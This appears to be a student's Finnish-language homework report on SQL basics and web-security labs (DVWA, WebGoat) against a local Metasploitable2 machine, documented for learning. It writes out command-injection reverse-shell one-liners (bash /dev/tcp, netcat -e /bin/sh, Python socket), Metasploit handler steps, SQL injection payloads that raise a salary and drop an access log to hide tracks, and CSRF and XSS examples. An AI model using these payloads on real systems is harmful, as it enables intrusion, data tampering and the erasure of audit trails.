# A
## 0 SELECT basics
Tehtävät olivat suhteellisen suoraviivaisia joten en niihin sen tarkemmin paneudu. Vaikka ovatkin kyllä hyvää kertausta
![image](https://user-images.githubusercontent.com/71498717/201321779-d361bcb7-1681-4225-9534-0db67eb2de6c.png)  
![image](https://user-images.githubusercontent.com/71498717/201321977-bbc77216-16c7-498e-9145-f0ef26cd9b0c.png)  
![image](https://user-images.githubusercontent.com/71498717/201322083-199b921c-741c-42bc-a41d-fa422452c0c1.png)  

## 2 SELECT from World kohdat 1-5
Valittiin taulusta tietyt kohdat mitkä haluttiin näyttää eli ei kaikkia  
![image](https://user-images.githubusercontent.com/71498717/201322619-5466360e-92b6-46e0-bb8c-a50d3476f7e7.png)  
Seuraavassa filteröitiin koon perusteella näkymään ne maat joissa on yli 200 miljoonaa asukasta  
![image](https://user-images.githubusercontent.com/71498717/201323066-7059d820-2575-4d95-9fc3-4c59dea28960.png)  
Seuraavassa piti jakaa gdp väkiluvulla ja palauttaa se tieto  
![image](https://user-images.githubusercontent.com/71498717/201323801-89ff2fbe-fbff-4c10-aa67-fc6b35aaa662.png)  
Seuraavassa jaettiin väkiluku miljoonalla, jotta saatiin väkiluku näkymään miljoonissa  
![image](https://user-images.githubusercontent.com/71498717/201324459-b9ffb40b-17f0-483a-b980-74310dfd1180.png)  
Viimeisessä valittiin tietyt maat nimen perusteella  
![image](https://user-images.githubusercontent.com/71498717/201325663-5fc87e67-d7f6-4ae7-a002-2f276187e803.png)  



# B Tee paikallinen tunnus DVWA Damn Vulnerable Web App -ohjelmaan
Ensin piti etisä metasploitable2 weppipalvelin joka löytyi, kun navigoi selaimella suotaan metasploitablen IP-osoitteeseen joka minulta löytyy ```192.168.252.3```  
![image](https://user-images.githubusercontent.com/71498717/201331029-f58f14e4-f967-4758-b035-d50dd1e3167a.png)  

Kirjaudutaan sisään annetuilla tunnuksilla  
![image](https://user-images.githubusercontent.com/71498717/201332391-228925e3-7aaf-450f-bde1-b49cec77c7a3.png)  

Ja käydään vaihtamassa DVWA Security low tasolle, jotta tehtävät olisi helpompia  

![image](https://user-images.githubusercontent.com/71498717/201332554-2ee707a5-c639-4e0b-900b-34ae334c8b5c.png)  


# C Execute! Ratkaise DVWA "Command Excution".
Aloitetaan kokeilemalla mitä tapahtuu jos käyttää sivua sen käyttötarkoitukseen eli pingaamiseen  
![image](https://user-images.githubusercontent.com/71498717/201343064-91dc8007-db61-42dc-a4f5-976780c113a3.png)  
Huomattiin, että sivu serveri ajaa ```ping 192.168.252.4```komennon ja palauttaa tulokset. Tästä voidaan päätellä, että komennot tapahtuu sivua pyörittävällä koneella. Mikäli komentoja putkitetaan ```;``` merkin avulla voidaan koneessa suorittaa komentoja. Komennolla ```192.168.252.4; ls``` listautuu koneen sen kansion tiedostot  
![image](https://user-images.githubusercontent.com/71498717/201347009-1e1d33b4-4871-4d6a-b386-a1c86dbb7ebd.png)  
Kokeillaan saadaanko tätä kautta avattua reverse shell omaan koneeseen. Avataan metasploit framework ja käytetään multi/handler moduulia ```use exploit/multi/handler ``` asetetaan payloadiksi linux/x64/meterpreter_reverse_tcp. ```set payload linux/x64/meterpreter_reverse_tcp``` ```options```´siitä aukeaa tarvittavat tiedot, jotta payload saadaan käytettyä oikein  
![image](https://user-images.githubusercontent.com/71498717/201350697-71d44fea-e5a9-41f9-a5cc-d1859a2edf1e.png)  
Pitää asettaa oman koneen ip kohtaan LHOST  ```set lhost 192.168.252.4``` ja portti olikin siellä valmiina niin ei tarvitse muuta kuin ```exploit```. Nähtävästi mentiin mutkat suoriksi ja itse exploit jäi asettamatta. Eli  ```use exploit/multi/handler ``` ```show payloads``` ```set payload 196```  
![image](https://user-images.githubusercontent.com/71498717/201351916-4a241a68-18c8-483e-a231-5462ad6b1dc7.png)  
```set lhost 192.168.252.4``` ja sitten muistetaan vielä laittaa palomuuri alas erillisessä shell ikkunassa```sudo ufw disable``` ja sen jälkeen exploit.  
![image](https://user-images.githubusercontent.com/71498717/201353594-df02b1c3-2ba8-4b38-a201-736b74f03987.png)  

Jotta reverse shell voidaan avata pitää dvwa sivulta lähettää komento shellin avaamiseksi. Sivulla https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet löytyy bashin komento joten kokeillaan sitä ensiksi. ```192.168.252.4; bash -i >& /dev/tcp/192.168.252.4/4444 0>&1``` syötetään tekstikenttään ja painetaan submit. Pari kertaa submittia painettuna täytyy tulla siihen tulokseen, että ei tällä komennolla ainakaan toimi. Joten kokeillaan toista. Kokeillaan pythonia ```192.168.252.4; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.252.4",4444))``` No ei sekään toiminut toivotulla tavalla. Sitten voisi kokeilla ihan perinteistä netcattia. ```192.168.252.4; nc -e /bin/sh 192.168.252.4 4444```. Sieltä saatiin jotain eloa, mutta ei saatu avattua reverse shelliä. Joten täytyy kokeilla jotain muuta.  
![image](https://user-images.githubusercontent.com/71498717/201360270-ccc591e2-fe0e-47fb-b90d-245ede2c99bb.png)  
Kokeillaan saadaanko eri payloadilla parempia onnistumisia. Käytetään ```set payload cmd/unix/reverse_netcat``` ja asetukset pysyy samana joten ```exploit```. dvwa sivulla käyetään ```192.168.252.4; nc -e /bin/sh 192.168.252.4 4444``` ja saatiin shelli auki  
![image](https://user-images.githubusercontent.com/71498717/201362357-6e2660d4-d1b1-4edc-88f0-e81c05d40a30.png)  
![image](https://user-images.githubusercontent.com/71498717/201362442-dca05cf9-52d9-4337-9762-92b1669bd233.png)  

Seuraavaksi yritetään päivittää yhteys meterpreter yhteyteen. Painetaan ```ctrl + z``` ja ```sessions -u 1``` ja saatin päivitettyä yhteys parempaan. ```Sessions 2``` komennolla avataan oikea sessio.

![image](https://user-images.githubusercontent.com/71498717/201365171-55dc484a-f430-417f-bc8f-0a053e7a1cb8.png)  

![image](https://user-images.githubusercontent.com/71498717/201366840-12b74fdf-de94-43be-a77f-49e0e1d6c3ab.png)  

Ja näin pääsimme koneeseen sisään.






 

# D
## SQL Injection (intro)
Tehtiin alta pois perus SQL kyselyiden toiminta

Ensimmäisessä kohdassa valittiin kyselylle

``` "SELECT * FROM user_data WHERE first_name = 'John' AND last_name = '" + lastName + "'"; ```

kun sukunimi oli 

``` ' or '1' ='1 ```
tuli kyselystä 
``` SELECT * FROM user_data WHERE first_name = 'John' and last_name = '' or '1' = '1' ```
Eli kun sukunimi oli "1 = 1" eli Tosi palautti kysely kaikki kohdat joista löytyi sukunimi

![image](https://user-images.githubusercontent.com/71498717/197777676-10a2f669-dd0c-4801-84b5-dcb4853f86eb.png)

Seuraavassa kohdassa kokeiltiin numeerista SQL injektiota kysely oli muodossa 
``` "SELECT * FROM user_data WHERE login_count = " + Login_Count + " AND userid = "  + User_ID; ```

Lisättiin Login_countn ja user_id 

``` Login_Count = 0 User_Id = 0 OR '1' = '1' ```

Jolloin kysely saatiin muotoon

``` SELECT * From user_data WHERE Login_Count = 0 and userid= 0 OR '1' = '1' ```

Näin ollen palautettiin user_data mikäli login_count = 0 JA userid = 0 TAI 1 = 1, eli kun user_data oli tosi se palautui ja näinollen palautti kaikki käyttäjät

![image](https://user-images.githubusercontent.com/71498717/197784877-e0c78026-0c49-44b9-9a8f-3595f01f41f5.png)

Seuraavassa kohdassa pääset katsomaan omia tietoja firman järjestelmässä tarvitset oman nimen ja TAN numeron. Kysely on muodossa
``` "SELECT * FROM employees WHERE last_name = '" + name + "' AND auth_tan = '" + auth_tan + "'; ```

Lisäämällä nimeksi minkätahansa ja TAN numeroksi  ```3SL99A' OR '1' = '1 ```

Tulee kyselystä seuraavanlainen

``` "SELECT * FROM employees WHERE last_name = 'Smith' AND auth_tan = '3SL99A' OR '1' = '1'; ```

Ja pääset näkemään kollegoiden tiedot

![image](https://user-images.githubusercontent.com/71498717/197787736-bc717237-8c9d-45e5-83fe-0d56cdf2bd9e.png)

Nyt on tarkoitus muokata omaa palkkaa ja kysely pysyy samana eli

``` "SELECT * FROM employees WHERE last_name = '" + name + "' AND auth_tan = '" + auth_tan + "'; ```

Kun muokataan jälleen auth_tan kohtaa sopivilla komennoilla saadaan palkka nousemaan

``` "SELECT * FROM employees WHERE last_name = 'Smith' AND auth_tan = 3SL99A'; UPDATE employees SET SALARY = '88000' WHERE AUTH_TAN = '3SL99A; ```
![image](https://user-images.githubusercontent.com/71498717/197791111-11ca9998-1484-4dd7-8a09-27d599d16599.png)

Viimeisessä kohdassa pyyhitään jäljet pudottamalla access_log. Itse saat kirjoittaa mitä action sisältää.

``` nothing ' ; DROP TABLE access_log;' ```

Tätä yritin monesti ja ei toiminut, mutta 

``` nothing ' ; DROP TABLE access_log;-- ```

Toimi, koska ilmeisesti -- lisäämällä loppuun kyselyn loppuosa muuttuu kommentiksi jolloin ' ja muitten määrän ei tarviste täsmätä tai mitä kyselyn jälkeen lukeekaan ei lueta ajettavaan komentoon.

![image](https://user-images.githubusercontent.com/71498717/197802436-ff24e95a-9412-4ff9-a9ff-faede6a8c12f.png)


## A2 Broken authentication
Tehtävä vaati, että POST kaapataan välissä ja muutetaan lähetettyä dataa, joten avataan ensin ZAP ja laitetaan se väliin. Avattiin Zapilla proxy selain ja laitetaan se katkaisemaan kaikki liikenne. Nyt on record aloitettu ja submit painettu webgoatista.Sitten selataan kunnes vastaan tulee haluttu POST request.  
![image](https://user-images.githubusercontent.com/71498717/201370683-7222f7b8-2529-4fb6-93fb-936fee681d37.png)  
Löydettiin haluttu ja nyt siitä poistetaan molemmat secQuestionit ja sen jälkeen annetaan requestin jatkaa matkaa.  
![image](https://user-images.githubusercontent.com/71498717/201371499-e364c6ab-cab6-424f-aca6-3e3bb639fc09.png)  
Se ei toiminut toivotulla tavalla joten kokeillaan jotain muuta.  
![image](https://user-images.githubusercontent.com/71498717/201382416-24f001ef-787c-4ad9-ac62-6e301cf82149.png)  
Kokeillaan jos vastauksiki vaihtaisi "true". Ja se ei toiminut.  
![image](https://user-images.githubusercontent.com/71498717/201382739-f917e201-3b80-4ff5-8f20-cd8582ff5e82.png)  
Kokeillaan josko uudelleen nimeäminen toimisi. Ja sehän toimi.  
![image](https://user-images.githubusercontent.com/71498717/201383053-4b9ed77c-2a0a-4577-90a3-3c644ba9976d.png)  
  
## A3 Sensitive data exposure
Tässäkin tehtävässä tulee käyttää ZAPpia pakettin pysäyttämiseen ja tutkimiseen. Joten zapista break päälle ja selaimesta log in.  
![image](https://user-images.githubusercontent.com/71498717/201383506-ab8e90f1-235e-40f4-8fda-55d93b8820c8.png)  
Sieltä paljastui käyttäjätunnus ja salasana, koska niitä ei ole salattu millään tavalla. Täytyy muistaa salata lähetetyt paketit jos niissä on jotain arkaluontoista.  
![image](https://user-images.githubusercontent.com/71498717/201383754-84e124d3-6b99-43a2-81b8-905c165d4fed.png)  


## A7 Cross Site Scripting (XSS): Cross site scripting

Ei toiminut scriptit URL kentässä joten piti laittaa ne konsoliin.  
![image](https://user-images.githubusercontent.com/71498717/201386122-49bf4acc-230c-4822-9fcf-92bb5d202541.png)  
![image](https://user-images.githubusercontent.com/71498717/201386275-be133adb-e0ad-4761-9759-8408c08cd20f.png)  
Näytti olevan sama cookie eri välilehtien välillä.

Tutkitaan sivua kehittäjän työkaluilla ja huomataan, että pankkikortin numeron kentän input type on text, joten sinne voi myös kirjoittaa  omaa koodia.  
![image](https://user-images.githubusercontent.com/71498717/201387442-7c2fd4bd-fcaf-453e-97d3-903898feff51.png)  
Kokeillaan ```<script>alert("hieno koru hermanni")</script>```  
![image](https://user-images.githubusercontent.com/71498717/201467738-1179613b-9670-46c6-9e84-4353c9377ee5.png)  
Ja sehän toimi. Toki vain omalla koneellani, joten ei mikään kovin kummoinen edesottamus.

## A8:2013 Request Forgeries
Aloitetaan tutkimalla koodia kehittäjän työkaluilla. Sieltä löytyy, että submit query nappula lähettää POST metodilla pyynnön.  
![image](https://user-images.githubusercontent.com/71498717/201469236-7ea96563-aa75-4888-bc6f-b5253cf6139a.png)  
Submit queryä painamalla saadaan "väärä" sivu auki.  
![image](https://user-images.githubusercontent.com/71498717/201469267-9c008799-1f79-459c-ac25-662e99bacda8.png)  
Nyt pitää luoda samanlainen POST pyyntö samalle sivulle, jotta saadaan sivu toivottavasti auki. Ja naamioidaan se pyyntö vielä html sivuksi. Pyyntöön pitää muistaa ottaa mukaan kaikki, mikä oli alkuperäisessä pyynnössä mukana.  
![image](https://user-images.githubusercontent.com/71498717/201469523-de7cd329-e0ad-4436-93f0-34f2407fed37.png)  
Tämänlainen siitä saatiin ja pitää muistaa nimetä tiedosto .html.  
![image](https://user-images.githubusercontent.com/71498717/201469611-87e23763-0079-4e30-b3e1-6940f7be5302.png)  
Saatiin hieno nappula sivulle ja sitä kun painaa niin aukeaa "oikea" sivu.  
![image](https://user-images.githubusercontent.com/71498717/201469682-fd906ee7-bfae-458f-aed1-89218db30773.png)  
![image](https://user-images.githubusercontent.com/71498717/201469694-d5e1375f-29ca-4701-81ab-1449cd6d1c85.png)  
![image](https://user-images.githubusercontent.com/71498717/201469707-0bc84857-4054-411b-95bd-a4d622008aa7.png)  

Seuraavaksi pitää lähettää arvostelu kirjautuneen käyttäjän puolesta, niin kokeillaan samaa metodia kuin aikaisemmassa eli tehdään .html tiedosto, joka lähettää POST:illa arvostelun. Aloitetaan tutkimalla lomaketta tarkemmin.  
![image](https://user-images.githubusercontent.com/71498717/201470127-51b81b76-8457-4785-80c1-ea435f3be21f.png)  
Muutetaan kaikista inputeista hidden, jotta käyttäjä ei näe mitä hän arvostelee.  
![image](https://user-images.githubusercontent.com/71498717/201470445-982044f9-6826-46d0-9b19-30fed92f8465.png)  
![image](https://user-images.githubusercontent.com/71498717/201470459-74e0f446-f6b8-474d-85a7-711eea1cc1f2.png)  
![image](https://user-images.githubusercontent.com/71498717/201470468-cb6dbdbd-74b6-4a36-b333-f094011d7d6b.png)  
Näytti arvostelu menevän läpi vaikka itse ei mitään kirjoittanut. Kuinkakohan tärkeä tuo validateReq on tuossa lomakkeessa? Nähtävästi tärkeä. ![image](https://user-images.githubusercontent.com/71498717/201470613-19eb42c3-3481-495e-8754-2aab5685b7ae.png)  
 




# X
## OWASP 10 2017
### A1 Injection
Haavoittuvuuksia löytyy yleensä SQL,LDAP,XPath,NoSQL ja XML ja muutamasta muusta.
Injektiot tehdään syöttämällä modifioitu parametri, minkä johdosta hyökkääjälle palautuu ylimääräistä dataa, tai hyökkääjä voi poistaa tauluja tai muokata niitä.
Esim. SQL tapauksessa hyökkääjä tulee SQL kyselyn ulkopuolelle käyttämällä ```'``` ja tekemällä toisen kyselyn perään tai käyttämällä ```' OR '1'=1´```.

### A2 Broken Authentication
Käytetään brute force tekniikkaa syöttämällä listoja tunnetuista salasanoista, jotta päästäisiin sisälle
Sovelluksen istuntoa ei keskeytetä tietyn ajan jälkeen ja sitä käytetään hyväksi, esim. julkisella koneella.
### A3 Sensitive Data Exposure
Salaista dataa ei ole salattu vaan se välitetään selkokielisenä. Hyökkääjä joka toimii väliäkätenä voi ottaa kaiken tiedon ylös.
Tietokanta käyttää automaattista salauksen purkua jolloin SQL injectiolla saa salatun datan selkokielisenä.
### A7 Cross Site Scripting
Hyökkääjä kaappaa käyttäjän cookien lähettämällä sen omalle sivulleen. Tämä on mahdollista, jos käyttäjän selaimessa on scripti, jonka voi saada esim painamalla, jotain linkkiä.
##  Chapter 21: Cross Site Scripting
- Jos uhrin selaimessa on xss haavoittuvuus ajetaan scripti selaimella.
- mikäli url sisältää muuttujien nimiä scriptejä pitäisi pystyä ajamaan.
- kommenttiosioon voi mahdollisesti tallentaa scriptejä, jotka ajetaan kaikilla sivulla vierailevilla.
- kommenttiosiossa voi olla myös scriptejä, jotka ajaa koodeja toiselta sivulta.
- selaimessa voi estää javascriptien ajon


# Y  Cross site story

Matti selailee nettiä ja törmää sivustoon, mikä antaa käyttäjän kirjoittaa sivulle kommentteja. Hetken pähkäiltyään hän kirjoittaa kommentteihin scriptin, joka lähettää käyttäjän cookien omalle serverilleen tiettyyn tiedostoon. Johannes eksyy samalle sivustolle ja kun hän lataa sivun kommentissa oleva scripti ajetaan hänen selaimessaan ja selain lähettää cookiensa Matin serverille. Tällä cookiella Matti voi käyttää Johanneksen istuntoa sillä sivustolla ja esiintyä Johanneksena.
